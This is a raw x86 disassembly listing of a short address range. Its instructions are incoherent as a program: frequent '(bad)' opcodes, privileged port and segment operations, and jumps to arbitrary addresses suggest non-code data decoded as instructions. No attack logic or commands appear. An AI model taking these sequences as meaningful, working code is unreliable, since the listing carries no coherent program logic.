  42b55f:	fpatan 
  42b561:	int3   
  42b562:	push   0x16c1557
  42b567:	jns    0x42b51c
  42b569:	sbb    al,0x10
  42b56b:	in     eax,dx
  42b56c:	adc    eax,0xb28bb5c2
  42b571:	and    BYTE PTR [edi+0x21],dl
  42b574:	mov    dl,0xc
  42b576:	retf   
  42b577:	inc    dh
  42b579:	mov    eax,ds:0x3bbbf3cd
  42b57e:	bound  ebp,QWORD PTR [ecx]
  42b580:	stos   DWORD PTR es:[edi],eax
  42b581:	xor    edx,DWORD PTR ds:0x6c5ac71d
  42b587:	inc    ecx
  42b588:	mov    eax,DWORD PTR [eax+0x1a9db211]
  42b58e:	data16 mov es,WORD PTR [eax]
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	outs   dx,DWORD PTR ds:[esi]
  42b601:	cmp    al,0x7d
  42b603:	loop   0x42b5c9
  42b605:	iret   
  42b606:	add    DWORD PTR [eax],eax
  42b608:	add    al,0x1
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	call   DWORD PTR [ecx+0xb6680de]
  42b612:	mov    esi,DWORD PTR [ebx+0x47bf7077]
  42b618:	cli    
  42b619:	sahf   
  42b61a:	and    al,0xc5
  42b61c:	(bad)  
  42b61e:	mov    DWORD PTR [eax+ebx*8],ebx
  42b621:	or     al,0x46
  42b623:	pop    es
  42b624:	repz test DWORD PTR ds:0xed396cea,ebp
  42b62b:	cwde   
  42b62c:	add    BYTE PTR [edx+0x27],cl
  42b62f:	arpl   WORD PTR [edx-0x35],sp
  42b632:	sub    eax,0x91b8a2d6
  42b637:	test   al,0x3b
  42b639:	ins    BYTE PTR es:[edi],dx
  42b63a:	xchg   BYTE PTR [eax+0xaed9078],al
  42b640:	mov    eax,0x76143309
  42b645:	sbb    eax,0x84bb2969
  42b64a:	(bad)  [esi+0x10a4888c]
  42b650:	mov    dh,0xaa
  42b652:	int3   
  42b653:	mov    esi,DWORD PTR [ebp+0x24]
  42b656:	jb     0x42b6be
  42b658:	adc    eax,DWORD PTR [esi+0x4d]
  42b65b:	lds    ebp,FWORD PTR [eax+0x3ca4a4d1]
  42b661:	add    ebp,edi
  42b663:	hlt    
  42b664:	push   ds
  42b665:	and    BYTE PTR [eax+0x3b],al
  42b668:	hlt    
  42b669:	data16 (bad) 
  42b66b:	out    0xac,eax
  42b66d:	sbb    al,0x6
  42b66f:	push   es
  42b670:	sub    DWORD PTR [esi+0x54],edx
  42b673:	test   al,0xa6
  42b675:	push   edi
  42b676:	ins    DWORD PTR es:[edi],dx
  42b677:	test   BYTE PTR [edi],ch
  42b679:	inc    ebx
  42b67a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b67b:	ret    0x9742
  42b67e:	fild   DWORD PTR [eax]
  42b680:	popf   
  42b681:	pop    edx
  42b682:	(bad)  
  42b683:	repz jl 0x42b687
  42b686:	mov    ds:0xe8489456,al
  42b68b:	hlt    
  42b68c:	adc    DWORD PTR [edi+0x30],0xffffffce
  42b690:	xor    BYTE PTR [ebx-0x52daa2d4],0x87
  42b697:	hlt    
  42b698:	sahf   
  42b699:	sbb    BYTE PTR [edi],bh
  42b69b:	in     al,dx
  42b69c:	pop    ss
  42b69d:	or     al,0xdd
  42b69f:	js     0x42b63a
  42b6a1:	push   cs
  42b6a2:	sbb    dl,BYTE PTR [edx]
  42b6a4:	xchg   esi,eax
  42b6a5:	hlt    
  42b6a6:	and    DWORD PTR [ecx+0x1d],ebp
  42b6a9:	adc    esi,edx
  42b6ab:	pop    ecx
  42b6ac:	ds pop ecx
  42b6ae:	sbb    DWORD PTR [edi+0x1c],edx
  42b6b1:	in     al,dx
  42b6b2:	and    edx,edx
  42b6b4:	cwde   
  42b6b5:	pop    ecx
  42b6b6:	inc    edi
  42b6b7:	and    bh,BYTE PTR [edx]
  42b6b9:	xor    al,0x6b
  42b6bb:	xor    bh,BYTE PTR [edi+0x16]
  42b6be:	fsin   
  42b6c0:	jno    0x42b716
  42b6c2:	sub    BYTE PTR es:[ebp+0x7f78a0ca],dl
  42b6c9:	(bad)  
  42b6ca:	jne    0x42b6bd
  42b6cc:	jp     0x42b6ee
  42b6ce:	lods   eax,DWORD PTR ds:[esi]
  42b6cf:	loope  0x42b729
  42b6d1:	pop    esp
  42b6d2:	inc    ebx
  42b6d3:	push   ds
  42b6d4:	popf   
  42b6d5:	jle    0x42b6e2
  42b6d7:	xchg   DWORD PTR [esi-0x4b],esi
  42b6da:	mov    DWORD PTR [esp+edx*4],edx
  42b6dd:	lods   al,BYTE PTR ds:[esi]
  42b6de:	add    bh,BYTE PTR [ebx]
  42b6e0:	ffreep st(5)
  42b6e2:	xor    DWORD PTR [edx+0x5b6eebc],ebp
  42b6e8:	jecxz  0x42b6fa
  42b6ea:	and    BYTE PTR [edi+0x79],al
  42b6ed:	and    esi,ecx
  42b6ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6f0:	and    BYTE PTR [eax+0x134f0cef],ah
  42b6f6:	dec    edx
  42b6f7:	lods   eax,DWORD PTR ds:[esi]
  42b6f8:	adc    edi,DWORD PTR [ebx+edx*2]
  42b6fb:	(bad)  
  42b6fd:	les    esi,FWORD PTR [esi+0x39d788d2]
  42b703:	inc    ecx
  42b704:	sbb    edx,DWORD PTR [edi-0x56]
  42b707:	mov    cs,WORD PTR [edx+0x56]
  42b70a:	lods   eax,DWORD PTR ds:[esi]
  42b70b:	sahf   
  42b70c:	cli    
  42b70d:	cmp    eax,0x4df9
	...
  42b772:	add    BYTE PTR [eax],al
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	push   ds
  42b781:	xor    edi,DWORD PTR [eax]
  42b783:	push   0xffffffc8
  42b785:	rol    BYTE PTR [ecx],1
  42b787:	add    BYTE PTR [ecx+eax*1],al
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	add    ch,BYTE PTR es:[ecx+eiz*2-0x43a6afd2]
  42b794:	mov    BYTE PTR [edx+0x7edd0b19],ch
  42b79a:	adc    bl,BYTE PTR [ebx-0x1330f7e8]
  42b7a0:	push   esp
  42b7a1:	aam    0xae
  42b7a3:	(bad)  
  42b7a4:	idiv   DWORD PTR [esi-0x484099f6]
  42b7aa:	adc    DWORD PTR [esi-0x61686dce],esp
  42b7b0:	cwde   
  42b7b1:	bound  ebp,QWORD PTR [esi+ebx*8+0x308c2211]
  42b7b8:	dec    eax
  42b7b9:	bound  edx,QWORD PTR [ebp+edx*8+0x26]
  42b7bd:	mov    esi,0xa9889d47
  42b7c2:	push   0xffffff84
  42b7c4:	sub    ecx,DWORD PTR [edi]
  42b7c6:	push   ds
  42b7c7:	dec    ebx
  42b7c8:	jnp    0x42b81a
  42b7ca:	stos   BYTE PTR es:[edi],al
  42b7cb:	(bad)  
  42b7ce:	fsubr  st,st(7)
  42b7d0:	xchg   ebp,eax
  42b7d1:	enter  0xf47b,0xd4
  42b7d5:	retf   
  42b7d6:	jmp    0x38c1ce0a
  42b7db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7dc:	les    edi,FWORD PTR [edi+0x3f]
  42b7df:	mov    ebx,0x7d20e575
  42b7e4:	add    DWORD PTR [ebp-0x68f9cd62],ebx
  42b7ea:	xor    cl,al
  42b7ec:	mov    eax,0x645763ce
  42b7f1:	jb     0x42b7c8
  42b7f3:	fcmovnb st,st(0)
  42b7f5:	nop
  42b7f6:	ins    BYTE PTR es:[edi],dx
  42b7f7:	repz sbb eax,0x239229ea
  42b7fd:	sbb    DWORD PTR cs:[esi+0x6020f202],0xffffffbf
  42b805:	pusha  
  42b806:	out    dx,al
  42b807:	jge    0x42b79c
  42b809:	sbb    eax,0x2e1bad68
  42b80e:	ret    
  42b80f:	sbb    DWORD PTR [ebp+eiz*2+0xd9ca307],ebx
  42b816:	(bad)  
  42b817:	dec    ebp
  42b818:	outs   dx,DWORD PTR ds:[esi]
  42b819:	push   ss
  42b81a:	inc    eax
  42b81b:	out    0xc,al
  42b81d:	xor    eax,edi
  42b81f:	dec    edi
  42b820:	xchg   ecx,eax
  42b821:	mov    esi,0xb7eff191
  42b826:	out    dx,al
  42b827:	rcl    bh,0x9a
  42b82a:	test   al,0x9
  42b82c:	cmp    dh,BYTE PTR [ebp+0x3bf1a876]
  42b832:	mov    esp,0x9c08cafd
  42b837:	pop    esi
  42b838:	cli    
  42b839:	adc    esp,ebx
  42b83b:	xor    esp,DWORD PTR [ecx+ebx*2+0x1b]
  42b83f:	pop    esi
  42b840:	mov    ebp,0x9ffbf028
  42b845:	adc    al,0xb3
  42b847:	cs stos DWORD PTR es:[edi],eax
  42b849:	pop    ds
  42b84a:	(bad)  
  42b84b:	cld    
  42b84c:	mov    edi,0x64131b8f
  42b851:	mov    esi,0xf1e259df
  42b856:	iret   
  42b857:	jle    0x42b801
  42b859:	jecxz  0x42b893
  42b85b:	pop    ebp
  42b85c:	call   0xa08b:0x2ee352a9
  42b863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b864:	or     eax,0x1bb9b801
  42b869:	test   eax,0x74979dd6
  42b86e:	imul   eax,DWORD PTR [edi],0xffffff8c
  42b871:	pop    esp
  42b872:	xchg   ebp,eax
  42b873:	fwait
  42b874:	mul    DWORD PTR [esi]
  42b876:	mov    bh,0x4
  42b878:	outs   dx,DWORD PTR ds:[esi]
  42b879:	xor    DWORD PTR [esi],eax
  42b87b:	sub    ebx,DWORD PTR [edi]
  42b87d:	add    DWORD PTR [edx-0x3e43fcb7],0x5b
  42b884:	(bad)  
  42b885:	int    0x3b
  42b887:	mov    ah,0xa8
  42b889:	sbb    DWORD PTR [ecx+0x5b84ed11],ecx
  42b88f:	fwait
	...
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     esi,DWORD PTR [edi-0x29]
  42b902:	push   edx
  42b903:	inc    esp
  42b904:	int3   
  42b905:	rol    DWORD PTR [ecx],1
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	iret   
  42b90d:	out    0x6c,al
  42b90f:	jl     0x42b8a1
  42b911:	mov    ebp,0x2681e71a
  42b916:	adc    al,0xa
  42b918:	xchg   edx,eax
  42b919:	iret   
  42b91a:	add    al,0x87
  42b91c:	jg     0x42b914
  42b91e:	cld    
  42b91f:	fs js  0x42b8b2
  42b922:	sbb    edi,DWORD PTR [edi+0x19]
  42b925:	(bad)  
  42b926:	retf   0x8cac
  42b929:	jns    0x42b98b
  42b92b:	ins    BYTE PTR es:[edi],dx
  42b92c:	mov    esi,0xc8bcc417
  42b931:	jmp    0xdf15dadd
  42b936:	sub    al,0xb1
  42b938:	jecxz  0x42b8ec
  42b93a:	outs   dx,DWORD PTR ds:[esi]
  42b93b:	adc    BYTE PTR [edx-0x4ab85f31],0x5f
  42b942:	fsub   QWORD PTR [edi-0x6e3f5c0c]
  42b948:	and    dl,cl
  42b94a:	xchg   ebp,eax
  42b94b:	sub    cl,BYTE PTR [eax]
  42b94d:	xchg   DWORD PTR [esi+eax*1+0x7c0f7505],esi
  42b954:	sub    al,0xd4
  42b956:	pop    ss
  42b957:	das    
  42b958:	js     0x42b935
  42b95a:	clc    
  42b95b:	repnz icebp 
  42b95d:	iret   
  42b95e:	icebp  
  42b95f:	pop    es
  42b960:	js     0x42b929
  42b962:	inc    ecx
  42b963:	mov    ebp,DWORD PTR [ecx]
  42b965:	mov    ebp,0x5207de1a
  42b96a:	pop    esi
  42b96b:	ret    
  42b96c:	mov    ah,0x15
  42b96e:	sub    DWORD PTR [ebx],ebx
  42b970:	mov    esi,ds
  42b972:	in     eax,dx
  42b973:	outs   dx,BYTE PTR ds:[esi]
  42b974:	aam    0xf9
  42b976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b977:	cld    
  42b978:	mov    ch,0x1e
  42b97a:	test   eax,0xb74c43f6
  42b97f:	and    esp,edx
  42b981:	dec    ecx
  42b982:	mov    eax,ds:0xf7e7342c
  42b987:	mov    WORD PTR gs:[esi-0x4c40a8c3],ds
  42b98e:	adc    dh,BYTE PTR [ebp-0x5c]
  42b991:	adc    ebx,esp
  42b993:	jmp    0xfb8a9a06
  42b998:	sbb    bh,BYTE PTR [ecx+0x52]
  42b99b:	mov    ecx,0xdda71021
  42b9a0:	add    al,0x17
  42b9a2:	push   edi
  42b9a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9a4:	je     0x42b957
  42b9a6:	dec    ecx
  42b9a7:	adc    al,0xe5
  42b9a9:	or     ecx,ebp
  42b9ab:	or     DWORD PTR [eax],0x10aa7fba
  42b9b1:	(bad)  [ebx-0x44]
  42b9b4:	popa   
  42b9b5:	and    dh,BYTE PTR [ebx+eax*4-0x1c01fe2d]
  42b9bc:	js     0x42ba17
  42b9be:	sbb    ecx,DWORD PTR [edx+edx*4+0x3a525e28]
  42b9c5:	fild   WORD PTR [ecx+0x1a88b86b]
  42b9cb:	mov    esp,ds
  42b9cd:	mov    WORD PTR [ebx-0x716e678f],es
  42b9d3:	and    ecx,DWORD PTR [edx]
  42b9d5:	dec    esp
  42b9d6:	dec    edx
  42b9d7:	adc    ah,BYTE PTR ds:[ebp-0x49aec2a9]
  42b9de:	arpl   di,cx
  42b9e0:	jb     0x42ba26
  42b9e2:	inc    ebx
  42b9e3:	in     eax,dx
  42b9e4:	inc    ecx
  42b9e5:	xor    ah,dh
  42b9e7:	jmp    0xa7cedc4b
  42b9ec:	mov    ch,0x35
  42b9ee:	cli    
  42b9ef:	sub    ah,BYTE PTR [ecx]
  42b9f1:	xchg   edx,eax
  42b9f2:	mov    dl,BYTE PTR [ebx+0x61a9fe9c]
  42b9f8:	mov    ds,esi
  42b9fa:	push   ebp
  42b9fb:	ret    
  42b9fc:	cmp    eax,0x5a
  42b9ff:	sbb    DWORD PTR [edx],ebx
  42ba01:	mov    dl,0x24
  42ba03:	push   edi
  42ba04:	and    ch,BYTE PTR [edx+0x5bfa25c1]
  42ba0a:	sub    DWORD PTR [ecx+0x0],ebx
  42ba0d:	test   DWORD PTR [edi],esi
  42ba0f:	rol    DWORD PTR [eax],1
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [ebp-0x2ff5fe16],edi
  42ba85:	rol    BYTE PTR [ecx],cl
  42ba87:	add    BYTE PTR [ecx+eax*1],al
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	gs lahf 
  42ba8e:	mov    ds:0xbed21cd,al
  42ba93:	mov    ds:0x27a9271a,eax
  42ba98:	imul   esp,DWORD PTR [ebx+0x6ea38871],0xfffffff2
  42ba9f:	or     al,0xd1
  42baa1:	aaa    
  42baa2:	data16 mov dh,0xb0
  42baa5:	out    0x74,al
  42baa7:	mov    dl,0xa3
  42baa9:	cmc    
  42baaa:	cdq    
  42baab:	and    ch,bh
  42baad:	add    al,BYTE PTR [ebx+ebx*8+0x33]
  42bab1:	and    BYTE PTR fs:[edi],cl
  42bab4:	retf   
  42bab5:	cli    
  42bab6:	les    edi,FWORD PTR [eax]
  42bab8:	sbb    al,0x8a
  42baba:	add    edx,DWORD PTR [ebp-0x58]
  42babd:	lds    edx,FWORD PTR [ebp+0x48f63c44]
  42bac3:	adc    al,0xdc
  42bac5:	dec    ebp
  42bac6:	push   edi
  42bac7:	jle    0x42ba8e
  42bac9:	(bad)  
  42baca:	jp     0x42baa6
  42bacc:	mov    dl,0x54
  42bace:	mul    ch
  42bad0:	adc    BYTE PTR [eax],ch
  42bad2:	lock sub al,0x39
  42bad5:	cmp    ebx,DWORD PTR [ebx+0x702873a0]
  42badb:	push   edx
  42badc:	outs   dx,DWORD PTR ds:[esi]
  42badd:	inc    edi
  42bade:	jnp    0x42baef
  42bae0:	lock mov ah,0x71
  42bae3:	ins    DWORD PTR es:[edi],dx
  42bae4:	adc    eax,0xf68bb0ad
  42bae9:	xlat   BYTE PTR ds:[ebx]
  42baea:	ror    ah,1
  42baec:	jg     0x42bb12
  42baee:	jecxz  0x42bb4e
  42baf0:	popa   
  42baf1:	lea    esi,[esi+ecx*1+0x5d1f9c8]
  42baf8:	cld    
  42baf9:	inc    eax
  42bafa:	test   eax,0x2517bf6f
  42baff:	adc    BYTE PTR [esi+0x66],ch
  42bb02:	add    BYTE PTR [eax],ch
  42bb04:	fcomp  QWORD PTR [edi]
  42bb06:	adc    eax,ebp
  42bb08:	mov    esi,0xbefd9554
  42bb0d:	or     dl,BYTE PTR [esi+edx*4]
  42bb10:	jmp    0xb4da:0x89d38605
  42bb17:	jmp    FWORD PTR [ebp-0x28]
  42bb1a:	jle    0x42baed
  42bb1c:	sbb    eax,0x7901beb7
  42bb21:	xlat   BYTE PTR ds:[ebx]
  42bb22:	das    
  42bb23:	mov    edx,edi
  42bb25:	bound  esi,QWORD PTR [edx]
  42bb27:	lock sbb al,0x88
  42bb2a:	xchg   ebp,eax
  42bb2b:	js     0x42bab4
  42bb2d:	and    BYTE PTR [eax],0xe
  42bb30:	push   ss
  42bb31:	call   0x547f:0xcc8473d0
  42bb38:	jecxz  0x42bb89
  42bb3a:	iret   
  42bb3b:	aad    0xff
  42bb3d:	outs   dx,DWORD PTR ds:[esi]
  42bb3e:	imul   cx,WORD PTR [esi+0x78bdb435],0xd013
  42bb47:	cdq    
  42bb48:	push   esi
  42bb49:	xor    al,0x66
  42bb4b:	xor    al,0xe8
  42bb4d:	icebp  
  42bb4e:	jmp    0x42bb5f
  42bb50:	xchg   ebx,eax
  42bb51:	add    eax,0x9ff6b30b
  42bb56:	sub    eax,0x516d87ee
  42bb5b:	adc    BYTE PTR [ecx],ch
  42bb5d:	mov    DWORD PTR [ebx-0x5],ebp
  42bb60:	ja     0x42bb24
  42bb62:	xchg   esi,ebp
  42bb64:	fiadd  WORD PTR [edx-0x5e]
  42bb67:	sub    ch,BYTE PTR [ecx+0x11]
  42bb6a:	cmp    BYTE PTR [edx-0x7cedd28],ah
  42bb70:	fsubr  QWORD PTR [ebx]
  42bb72:	cld    
  42bb73:	push   edx
  42bb74:	push   esp
  42bb75:	es adc al,0x9
  42bb78:	fdivrp st(7),st
  42bb7a:	lahf   
  42bb7b:	in     al,0xf9
  42bb7d:	adc    bh,BYTE PTR [edx-0x3d]
  42bb80:	enter  0x2063,0x1d
  42bb84:	adc    al,0x39
  42bb86:	shl    BYTE PTR [edi+0x3d],1
  42bb89:	adc    esp,DWORD PTR ds:[eax]
  42bb8c:	mov    al,0xe7
  42bb8e:	dec    ecx
  42bb8f:	test   BYTE PTR [eax],0x0
	...
  42bbf2:	add    BYTE PTR [eax],al
  42bbf4:	xor    al,0x28
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc01:	shr    DWORD PTR [ebp+0x1d3d490],0x0
  42bc08:	add    al,0x1
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	or     eax,0x27336a4a
  42bc11:	sbb    al,0x3c
  42bc13:	push   ebp
  42bc14:	int    0x7a
  42bc16:	pushf  
  42bc17:	pop    ds
  42bc18:	lock push ds
  42bc1a:	aad    0xbe
  42bc1c:	(bad)  
  42bc1d:	out    0xc8,al
  42bc1f:	pop    esi
  42bc20:	std    
  42bc21:	aaa    
  42bc22:	scas   eax,DWORD PTR es:[edi]
  42bc23:	sub    esi,DWORD PTR [ebp+eiz*2+0x255c2725]
  42bc2a:	icebp  
  42bc2b:	inc    esp
  42bc2c:	sahf   
  42bc2d:	push   0x36
  42bc2f:	pop    edx
  42bc30:	jnp    0x42bbcb
  42bc32:	mov    esi,0x1fbc6465
  42bc37:	adc    ebp,eax
  42bc39:	popa   
  42bc3a:	dec    esp
  42bc3b:	icebp  
  42bc3c:	dec    edi
  42bc3d:	add    DWORD PTR [edx+0x11adf406],ebp
  42bc43:	or     al,0x50
  42bc45:	pop    ebp
  42bc46:	inc    edx
  42bc47:	repz jl 0x42bcb0
  42bc4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc4b:	jb     0x42bc24
  42bc4d:	inc    ebp
  42bc4e:	jb     0x42bc59
  42bc50:	retf   0x7410
  42bc53:	ss dec esp
  42bc55:	adc    esp,DWORD PTR [ebx]
  42bc57:	dec    edx
  42bc58:	inc    ebp
  42bc59:	shr    DWORD PTR [ebp-0x30bd7edd],0x6e
  42bc60:	(bad)  
  42bc61:	loope  0x42bcd5
  42bc63:	sub    DWORD PTR [edi+0x1b],edi
  42bc66:	xchg   esp,eax
  42bc67:	sbb    dl,bl
  42bc69:	push   ebp
  42bc6a:	jl     0x42bc94
  42bc6c:	sub    BYTE PTR [ebp+0x5e21372a],0xdb
  42bc73:	adc    bl,BYTE PTR [edi]
  42bc75:	pop    ss
  42bc76:	pop    ss
  42bc77:	xchg   ebx,eax
  42bc78:	pop    ds
  42bc79:	pop    ebx
  42bc7a:	xchg   ebp,eax
  42bc7b:	es mov esp,gs
  42bc7e:	ret    0x730c
  42bc81:	jae    0x42bcbf
  42bc83:	int    0x8a
  42bc85:	ficomp DWORD PTR [edi+0x131b4a0a]
  42bc8b:	int3   
  42bc8c:	pop    ss
  42bc8d:	outs   dx,BYTE PTR ds:[esi]
  42bc8e:	cwde   
  42bc8f:	pop    edi
  42bc90:	aas    
  42bc91:	leave  
  42bc92:	hlt    
  42bc93:	or     al,0x28
  42bc95:	pop    edx
  42bc96:	mov    edx,0xc9896994
  42bc9b:	add    BYTE PTR [ecx+esi*4],al
  42bc9e:	outs   dx,DWORD PTR ds:[esi]
  42bc9f:	pop    ecx
  42bca0:	cmp    DWORD PTR [ebp+0x1e037937],eax
  42bca6:	iret   
  42bca7:	xor    al,0x1f
  42bca9:	xchg   BYTE PTR [ecx+edi*1],ch
  42bcac:	mov    edi,0x608ddc81
  42bcb1:	arpl   si,bx
  42bcb3:	mov    al,gs:0xc342985b
  42bcb9:	push   ebp
  42bcba:	fild   WORD PTR [ecx]
  42bcbc:	jmp    0xbcbe8a7f
  42bcc1:	adc    DWORD PTR ds:0x13fa8952,esi
  42bcc7:	cmp    ah,BYTE PTR [edx+0x6f]
  42bcca:	mul    BYTE PTR [eax*8-0x3817ec2]
  42bcd1:	popf   
  42bcd2:	or     BYTE PTR [esi],al
  42bcd4:	pop    esp
  42bcd5:	mov    ds:0x7c0a91b6,eax
  42bcda:	lods   al,BYTE PTR ds:[esi]
  42bcdb:	mov    ah,0xaf
  42bcdd:	push   ebx
  42bcde:	jnp    0x42bc77
  42bce0:	cwde   
  42bce1:	sub    ch,bh
  42bce3:	stc    
  42bce4:	es ret 0x2250
  42bce8:	push   esp
  42bce9:	repz mov esp,0xc452c50d
  42bcef:	pop    ds
  42bcf0:	mov    ds:0x4df72901,eax
  42bcf5:	imul   BYTE PTR [eax]
  42bcf7:	bound  edi,QWORD PTR [ebp-0x4086f2f1]
  42bcfd:	push   ecx
  42bcfe:	repz aaa 
  42bd00:	cmp    eax,0xb9f3dd39
  42bd05:	push   edx
  42bd06:	mov    WORD PTR [eax+ebx*2-0x1b85ab21],cs
  42bd0d:	pop    edx
  42bd0e:	repz lea eax,[eax]
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd07
  42bd81:	imul   ebx,DWORD PTR [edi],0xffffffa4
  42bd84:	fcom   st(4)
  42bd86:	add    DWORD PTR [eax],eax
  42bd88:	add    al,0x1
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	cmc    
  42bd8d:	mov    BYTE PTR [edx-0x62],dl
  42bd90:	adc    DWORD PTR [eax-0x5],esi
  42bd93:	cmp    al,BYTE PTR [ebx]
  42bd95:	add    ebx,DWORD PTR [ecx+0x6b852f6a]
  42bd9b:	sbb    al,0xdf
  42bd9d:	lea    eax,[eax+0x7ed4e1ed]
  42bda3:	or     dh,al
  42bda5:	repz adc ecx,DWORD PTR [edx]
  42bda8:	sub    dh,cl
  42bdaa:	xchg   edx,eax
  42bdab:	(bad)  
  42bdac:	adc    dl,al
  42bdae:	mov    ebp,0x11b077cb
  42bdb3:	or     eax,0x5b401700
  42bdb8:	and    cl,cl
  42bdba:	mov    al,0xb0
  42bdbc:	xlat   BYTE PTR ds:[ebx]
  42bdbd:	mov    dh,0x61
  42bdbf:	pop    ebx
  42bdc0:	pop    eax
  42bdc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bdc2:	adc    esi,edi
  42bdc4:	xlat   BYTE PTR ds:[ebx]
  42bdc5:	pop    esp
  42bdc6:	pop    es
  42bdc7:	dec    edi
  42bdc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bdc9:	dec    esp
  42bdca:	dec    esp
  42bdcb:	xchg   ecx,eax
  42bdcc:	imul   ecx,DWORD PTR [esi],0x10
  42bdcf:	mov    WORD PTR ds:0xbd9f46a,gs
  42bdd5:	sub    DWORD PTR [ebx+0x4f712d29],0x2444e536
  42bddf:	repz scas al,BYTE PTR es:[edi]
  42bde1:	mov    ds:0xf68afa85,al
  42bde6:	cmp    bl,BYTE PTR [ebx]
  42bde8:	aas    
  42bde9:	xchg   esi,eax
  42bdea:	xchg   DWORD PTR [edi],edi
  42bdec:	ss ds dec ebp
  42bdef:	mov    ?,WORD PTR [esi+0x4d1dbc0a]
  42bdf5:	mov    fs,WORD PTR [ebx]
  42bdf7:	xlat   BYTE PTR ds:[ebx]
  42bdf8:	loop   0x42bd9f
  42bdfa:	sub    bl,BYTE PTR [ebx+0x4130ff62]
  42be00:	(bad)  
  42be01:	jmp    0xc630:0xf0a54eb
  42be08:	jecxz  0x42be3b
  42be0a:	sub    esp,DWORD PTR [edi-0x1e]
  42be0d:	jecxz  0x42be29
  42be0f:	or     BYTE PTR [eax-0x2544bb84],0x23
  42be16:	add    bl,dh
  42be18:	or     ch,dl
  42be1a:	rol    DWORD PTR [edi-0x3c],0xcb
  42be1e:	inc    ebx
  42be1f:	or     esi,DWORD PTR [ebp+0x25]
  42be22:	dec    edi
  42be23:	cli    
  42be24:	sbb    eax,ebx
  42be26:	mov    esp,0xf9a70ab2
  42be2b:	mov    WORD PTR [ecx],?
  42be2d:	iret   
  42be2e:	lods   eax,DWORD PTR ds:[esi]
  42be2f:	sbb    eax,0x7e24c9cc
  42be34:	test   DWORD PTR [ebx],ebp
  42be36:	aaa    
  42be37:	cmp    DWORD PTR [ebx+eax*1+0x729576d6],0x54
  42be3f:	int3   
  42be40:	fmul   QWORD PTR [ecx+ecx*8+0x2f958e57]
  42be47:	(bad)
  42be4a:	out    dx,al
  42be4b:	jmp    0x42be52
  42be4d:	test   al,0x80
  42be4f:	add    eax,ebp
  42be51:	sar    eax,0xb0
  42be54:	ins    DWORD PTR es:[edi],dx
  42be55:	ret    
  42be56:	in     eax,dx
  42be57:	dec    ebx
  42be58:	enter  0xfabf,0xad
  42be5c:	test   eax,0xbb57bc
  42be61:	cs xchg esp,eax
  42be63:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be65:	push   ebp
  42be66:	daa    
  42be67:	mov    al,0xd9
  42be69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be6a:	xor    BYTE PTR [edi-0x7b4dc1ef],bl
  42be70:	pushf  
  42be71:	fcomp  DWORD PTR [ecx-0x6a187d8e]
  42be77:	xor    esi,esp
  42be79:	aaa    
  42be7a:	clc    
  42be7b:	pop    DWORD PTR [esi]
  42be7d:	sbb    BYTE PTR [ebp-0x37],0xf7
  42be81:	xchg   ebx,eax
  42be82:	sbb    al,0x5e
  42be84:	(bad)  
  42be85:	and    DWORD PTR [edx],eax
  42be87:	es cmp edx,0xfffffff2
  42be8b:	push   edx
  42be8c:	stos   BYTE PTR es:[edi],al
  42be8d:	mov    dl,0xa5
  42be8f:	scas   al,BYTE PTR es:[edi]
	...
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0xc7bd7c8,eax
  42bf01:	lods   eax,DWORD PTR ds:[esi]
  42bf02:	mov    edi,0x1d5dcf1
  42bf07:	add    BYTE PTR [ecx+eax*1],al
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	sub    BYTE PTR [edi],0xac
  42bf0f:	popf   
  42bf10:	pushf  
  42bf11:	dec    edi
  42bf12:	mov    edi,DWORD PTR [edx]
  42bf14:	inc    edx
  42bf15:	loopne 0x42bf7f
  42bf17:	add    bl,cl
  42bf19:	mov    DWORD PTR ds:0xc917385e,0x9355a897
  42bf23:	and    eax,0xc143dd68
  42bf28:	adc    edx,ebp
  42bf2a:	xchg   DWORD PTR [ebp-0x6a],esp
  42bf2d:	sub    eax,0xa43f5332
